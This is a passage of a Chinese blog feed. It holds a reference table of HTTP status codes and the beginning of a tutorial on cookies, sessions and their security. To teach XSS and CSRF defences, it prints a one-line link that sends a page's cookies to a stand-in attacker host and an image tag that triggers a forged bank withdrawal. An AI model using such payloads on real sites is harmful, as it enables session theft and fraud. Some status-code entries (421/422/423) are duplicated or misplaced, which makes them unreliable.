        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 务必要十分熟悉常见状态码 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="状态码类别"><a href="#状态码类别" class="headerlink" title="状态码类别"></a>状态码类别</h3><table><thead><tr><th>状态码</th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>Informational（信息性状态码）</td><td>接受的请求正在处理</td></tr><tr><td>2XX</td><td>Success（成功状态码）</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>Redirection（重定向状态码）</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>Client Error（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>Server Error（服务器错误状态码）</td><td>服务器处理请求出错</td></tr></tbody></table><h4 id="2XX——表明请求被正常处理了"><a href="#2XX——表明请求被正常处理了" class="headerlink" title="2XX——表明请求被正常处理了"></a>2XX——表明请求被正常处理了</h4><ul><li>200 OK：请求已正常处理。</li><li>204 No Content：请求处理成功，但没有任何资源可以返回给客户端，一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</li><li>206 Partial Content：是对资源某一部分的请求，该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容。</li></ul><h4 id="3XX——表明浏览器需要执行某些特殊的处理以正确处理请求"><a href="#3XX——表明浏览器需要执行某些特殊的处理以正确处理请求" class="headerlink" title="3XX——表明浏览器需要执行某些特殊的处理以正确处理请求"></a>3XX——表明浏览器需要执行某些特殊的处理以正确处理请求</h4><ul><li>301 Moved Permanently：资源的uri已更新，你也更新下你的书签引用吧。永久性重定向，请求的资源已经被分配了新的URI，以后应使用资源现在所指的URI。</li><li>302 Found：资源的URI已临时定位到其他位置了，姑且算你已经知道了这个情况了。临时性重定向。和301相似，但302代表的资源不是永久性移动，只是临时性性质的。换句话说，已移动的资源对应的URI将来还有可能发生改变。</li><li>303 See Other：资源的URI已更新，你是否能临时按新的URI访问。该状态码表示由于请求对应的资源存在着另一个URL，应使用GET方法定向获取请求的资源。303状态码和302状态码有着相同的功能，但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。</li><li>304 Not Modified：资源已找到，但未符合条件请求。该状态码表示客户端发送附带条件的请求时（采用GET方法的请求报文中包含If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since中任一首部）服务端允许请求访问资源，但因发生请求未满足条件的情况后，直接返回304.。</li><li>307 Temporary Redirect：临时重定向。与302有相同的含义。</li></ul><p>当301,302,303响应状态码返回时，几乎所有的浏览器都会把POST改成GET，并删除请求报文内的主体，之后请求会自动再次发送。</p><h4 id="4XX——表明客户端是发生错误的原因所在"><a href="#4XX——表明客户端是发生错误的原因所在" class="headerlink" title="4XX——表明客户端是发生错误的原因所在"></a>4XX——表明客户端是发生错误的原因所在</h4><ul><li>400 Bad Request：服务器端无法理解客户端发送的请求，请求报文中可能存在语法错误。</li><li>401 Unauthorized：该状态码表示发送的请求需要有通过HTTP认证（BASIC认证，DIGEST认证）的认证信息。</li><li>403 Forbidden：不允许访问那个资源。该状态码表明对请求资源的访问被服务器拒绝了。（权限，未授权IP等）</li><li>404 Not Found：服务器上没有请求的资源。路径错误等。</li></ul><h4 id="5XX——服务器本身发生错误"><a href="#5XX——服务器本身发生错误" class="headerlink" title="5XX——服务器本身发生错误"></a>5XX——服务器本身发生错误</h4><ul><li>500 Internal Server Error：貌似内部资源出故障了。该状态码表明服务器端在执行请求时发生了错误。也有可能是web应用存在bug或某些临时故障。</li><li>503 Service Unavailable：抱歉，我现在正在忙着。该状态码表明服务器暂时处于超负载或正在停机维护，现在无法处理请求。</li></ul><h3 id="状态码详解"><a href="#状态码详解" class="headerlink" title="状态码详解"></a>状态码详解</h3><table><thead><tr><th>状态码</th><th align="left">含义</th></tr></thead><tbody><tr><td>100</td><td align="left">客户端应当继续发送请求。这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。</td></tr><tr><td>101</td><td align="left">服务器已经理解了客户端的请求，并将通过Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade 消息头中定义的那些协议。 　　只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP 版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特性的资源。</td></tr><tr><td>102</td><td align="left">由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行。</td></tr><tr><td>200</td><td align="left">请求已成功，请求所希望的响应头或数据体将随此响应返回。</td></tr><tr><td>201</td><td align="left">请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 ‘202 Accepted’。</td></tr><tr><td>202</td><td align="left">服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。 　　返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</td></tr><tr><td>203</td><td align="left">服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超级。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的。</td></tr><tr><td>204</td><td align="left">服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。 　　如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。 　　由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。</td></tr><tr><td>205</td><td align="left">服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。 　　与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。</td></tr><tr><td>206</td><td align="left">服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。 　　该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。 　　响应必须包含如下的头部域： 　　Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。 　　Date 　　ETag 和/或 Content-Location，假如同样的请求本应该返回200响应。 　　Expires, Cache-Control，和/或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。 　　假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。 　　假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。 　　任何不支持 Range 以及 Content-Range 头的缓存都禁止缓存206响应返回的内容。</td></tr><tr><td>207</td><td align="left">由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</td></tr><tr><td>300</td><td align="left">被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。 　　除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。 　　如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</td></tr><tr><td>301</td><td align="left">被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。 　　新的永久性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 　　如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 　　注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个301响应的话，接下来的重定向请求将会变成 GET 方式。</td></tr><tr><td>302</td><td align="left">请求的资源现在临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 　　新的临时性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 　　如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 　　注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。</td></tr><tr><td>303</td><td align="left">对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。 　　新的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 　　注意：许多 HTTP/1.1 版以前的 浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</td></tr><tr><td>304</td><td align="left">如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。 　　该响应必须包含以下的头信息： 　　Date，除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则，那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去（正如RFC 2068中规定的一样），缓存机制将会正常工作。 　　ETag 和/或 Content-Location，假如同样的请求本应返回200响应。 　　Expires, Cache-Control，和/或Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。 　　假如本响应请求使用了强缓存验证，那么本次响应不应该包含其他实体头；否则（例如，某个带条件的 GET 请求使用了弱缓存验证），本次响应禁止包含其他实体头；这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。 　　假如某个304响应指明了当前某个实体没有缓存，那么缓存系统必须忽视这个响应，并且重复发送不包含限制条件的请求。 　　假如接收到一个要求更新某个缓存条目的304响应，那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。</td></tr><tr><td>305</td><td align="left">被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。 　　注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。</td></tr><tr><td>306</td><td align="left">在最新版的规范中，306状态码已经不再被使用。</td></tr><tr><td>307</td><td align="left">请求的资源现在临时从不同的URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 　　新的临时性的URI 应当在响应的 Location 域中返回。除非这是一个HEAD 请求，否则响应的实体中应当包含指向新的URI 的超链接及简短说明。因为部分浏览器不能识别307响应，因此需要添加上述必要信息以便用户能够理解并向新的 URI 发出访问请求。 　　如果这不是一个GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</td></tr><tr><td>400</td><td align="left">1、语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。 　　2、请求参数有误。</td></tr><tr><td>401</td><td align="left">当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。参见RFC 2617。</td></tr><tr><td>402</td><td align="left">该状态码是为了将来可能的需求而预留的。</td></tr><tr><td>403</td><td align="left">服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</td></tr><tr><td>404</td><td align="left">请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</td></tr><tr><td>405</td><td align="left">请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。 　　鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</td></tr><tr><td>406</td><td align="left">请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。 　　除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</td></tr><tr><td>407</td><td align="left">与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。参见RFC 2617。</td></tr><tr><td>408</td><td align="left">请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。</td></tr><tr><td>409</td><td align="left">由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。 　　冲突通常发生于对 PUT 请求的处理中。例如，在采用版本检查的环境下，某次 PUT 提交的对特定资源的修改请求所附带的版本信息与之前的某个（第三方）请求向冲突，那么此时服务器就应该返回一个409错误，告知用户请求无法完成。此时，响应实体中很可能会包含两个冲突版本之间的差异比较，以便用户重新提交归并以后的新版本。</td></tr><tr><td>410</td><td align="left">被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用404状态码。除非额外说明，否则这个响应是可缓存的。 　　410响应的目的主要是帮助网站管理员维护网站，通知用户该资源已经不再可用，并且服务器拥有者希望所有指向这个资源的远端连接也被删除。这类事件在限时、增值服务中很普遍。同样，410响应也被用于通知客户端在当前服务器站点上，原本属于某个个人的资源已经不再可用。当然，是否需要把所有永久不可用的资源标记为’410 Gone’，以及是否需要保持此标记多长时间，完全取决于服务器拥有者。</td></tr><tr><td>411</td><td align="left">服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。</td></tr><tr><td>412</td><td align="left">服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</td></tr><tr><td>413</td><td align="left">服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。 　　如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</td></tr><tr><td>414</td><td align="left">请求的URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括： 　　本应使用POST方法的表单提交变成了GET方法，导致查询字符串（Query String）过长。 　　重定向URI “黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。 　　客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行[1]。没有此类漏洞的服务器，应当返回414状态码。</td></tr><tr><td>415</td><td align="left">对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。</td></tr><tr><td>416</td><td align="left">如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回416状态码。 　　假如 Range 使用的是字节范围，那么这种情况就是指请求指定的所有数据范围的首字节位置都超过了当前资源的长度。服务器也应当在返回416状态码的同时，包含一个 Content-Range 实体头，用以指明当前资源的长度。这个响应也被禁止使用 multipart/byteranges 作为其 Content-Type。</td></tr><tr><td>417</td><td align="left">在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服务器，它有明显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。</td></tr><tr><td>421</td><td align="left">从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。</td></tr><tr><td>422</td><td align="left">从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。</td></tr><tr><td>423</td><td align="left">请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）423 Locked 　　当前资源被锁定。（RFC 4918 WebDAV）</td></tr><tr><td>424</td><td align="left">由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV）</td></tr><tr><td>425</td><td align="left">在WebDav Advanced Collections 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。</td></tr><tr><td>426</td><td align="left">客户端应当切换到TLS/1.0。（RFC 2817）</td></tr><tr><td>449</td><td align="left">由微软扩展，代表请求应当在执行完适当的操作后进行重试。</td></tr><tr><td>500</td><td align="left">服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器的程序码出错时出现。</td></tr><tr><td>501</td><td align="left">服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。</td></tr><tr><td>502</td><td align="left">作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</td></tr><tr><td>503</td><td align="left">由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理500响应的方式处理它。 　　注意：503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。</td></tr><tr><td>504</td><td align="left">作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。 　　注意：某些代理服务器在DNS查询超时时会返回400或者500错误</td></tr><tr><td>505</td><td align="left">服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</td></tr><tr><td>506</td><td align="left">由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</td></tr><tr><td>507</td><td align="left">服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918)</td></tr><tr><td>509</td><td align="left">服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</td></tr><tr><td>510</td><td align="left">获取资源所需要的策略并没有没满足。（RFC 2774）</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookie与session</title>
      <link href="/2018/07/08/2018-07-08-cookie%E4%B8%8Esession/"/>
      <url>/2018/07/08/2018-07-08-cookie%E4%B8%8Esession/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> web中的会话跟踪技术 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="为什么要有cookie-session"><a href="#为什么要有cookie-session" class="headerlink" title="为什么要有cookie/session?"></a>为什么要有cookie/session?</h3><p>在客户端浏览器向服务器发送请求，服务器做出响应之后，二者便会断开连接(一次会话结束)。那么下次用户再来请求服务器，服务器没有任何办法去识别此用户是谁。比如web系统常用的用户登录功能，如果没有cookie机制支持，那么只能通过查询数据库实现，并且要命的是每次刷新页面都要重新输入表单信息查询一次数据库才可以识别用户，这会给开发人员带来大量冗余工作并且简单的用户登录功能会给服务器带来巨大的压力。</p><p>在此背景下，就急需一种机制来解决此问题。分析可知，以上需求的实现就要客户端每次访问服务器时从客户端带上一些数据(相当于身份证)告知服务器自己是谁。这个数据就是cookie！并且客户端访问服务器时不能将所有cookie都带过去，比如访问百度就不能把谷歌的cookie带给百度，这个设置方式在后面介绍。</p><p>那么有了cookie，为什么还要有session呢？有了cookie可以向服务器证明用户身份了，我们的web系统中是不是需要将用户的详细信息储存在某个位置供页面调用呢？用户的详细信息就包括姓名，年龄，性别等信息。而cookie是存在于客户端的，将用户详细信息通过网络发送到客户端保存是极不安全的。且cookie大小不能超过4k，不能支持中文。这就限制cookie不能满足存储用户信息的需求。这就需要一种机制在服务器端的某个域中存储一些数据，这个域就是session。</p><p>总而言之，cookie/session的出现就是为了解决http协议无状态的弊端，为了让客户端和服务端建立长久联系而出现的。</p><img src="/2018/07/08/2018-07-08-cookie与session/pic1.jpeg"><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><h4 id="cookie是什么"><a href="#cookie是什么" class="headerlink" title="cookie是什么"></a>cookie是什么</h4><p>cookie翻译过来是“饼干，甜品”的意思，cookie在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王小二，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。</p><img src="/2018/07/08/2018-07-08-cookie与session/pic2.png"><p>如图所示，用户首次访问服务器，服务器会返回一个独一无二的识别码：id=23451。这样服务器可以用这个id跟踪记录用户的信息：购物历史、地址信息等）。cookie可以包含任意的信息，不仅仅是id，客户端会记录服务器返回来的Set-Cookie首部中的cookie内容。并将cookie存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XXX的身份证（cookie），并在Cookie请求首部发送过去。</p><h4 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h4><ul><li>每次请求都会在头带上cookie（带宽流量）</li><li>Cookie的主要内容包括：名字，值，过期时间，路径和域</li><li>名字和值以key=&gt;value形式，保存在客户端（不能超过4k，不能支持中文）</li><li>过期时间可设置：<ul><li>cookie.setMaxAge(0)（立即删除cookie）</li><li>cookie.setMaxAge(-1)（缺省值，只将cookie保存在内存中，浏览器一旦关闭，cookie就会被清空）</li><li>cookie.setMaxAge(60*60)（浏览器会将cookie保存在硬盘上，超过指定时间会删除该cookie）</li></ul></li><li>路径和域就是对应的域名，a网站的cookie自然不能给b用，具有不可跨域名性</li></ul><h4 id="安全性问题"><a href="#安全性问题" class="headerlink" title="安全性问题"></a>安全性问题</h4><p>多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种cookie盗用和会话劫持的例子：</p><h5 id="网络窃听"><a href="#网络窃听" class="headerlink" title="网络窃听"></a>网络窃听</h5><p>网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。</p><p>解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。</p><h5 id="DNS缓存中毒"><a href="#DNS缓存中毒" class="headerlink" title="DNS缓存中毒"></a>DNS缓存中毒</h5><p>如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了。</p><p>例如：攻击者使用DNS中毒来创建一个虚拟的NDS服务 <u>h123456.demo.com</u> 指向攻击者服务器的ip地址。然后攻击者可以从服务器 <u>h123456.demo.com/img_01.png</u> 发布图片。用户访问这个图片，由于 <u>demo.com</u> 和 <u>h123456.demo.com</u> 是同一个子域，所以浏览器会把用户的与 <u>demo.com</u> 相关的cookie都会发送到 <u>h123456.demo.com</u> 这个服务器上，这样攻击者就会拿到用户的cookie搞事情。</p><h5 id="跨站点脚本XSS"><a href="#跨站点脚本XSS" class="headerlink" title="跨站点脚本XSS"></a>跨站点脚本XSS</h5><p>使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。</p><p>例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">onclick</span>=`<span class="attr">window.location</span>=<span class="string">http://abc.com?cookie</span>=<span class="string">$&#123;docuemnt.cookie&#125;</span>`&gt;</span>领取红包<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。</p><p>解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。</p><h5 id="跨站请求伪造CSRF"><a href="#跨站请求伪造CSRF" class="headerlink" title="跨站请求伪造CSRF"></a>跨站请求伪造CSRF</h5><p>例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.bank.com/withdraw?user=SanShao&amp;amount=999999&amp;for=XiaoMing"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。</p><p>解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。</p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><h4 id="session是什么"><a href="#session是什么" class="headerlink" title="session是什么"></a>session是什么</h4><p>session，中文经常翻译为会话，其本来的含义是指有始有终的一系列动作/消息，比如打电话时从拿起电话拨号到挂断电话这中间的一系列过程可以称之为一个session。到了web服务器蓬勃发展的时代，session在web开发语境下的语义又有了新的扩展，它的含义是指一类用来在客户端与服务器之间保持状态的解决方案。有时候session也用来指这种解决方案的存储结构，如“把xxx保存在session里”。</p><img 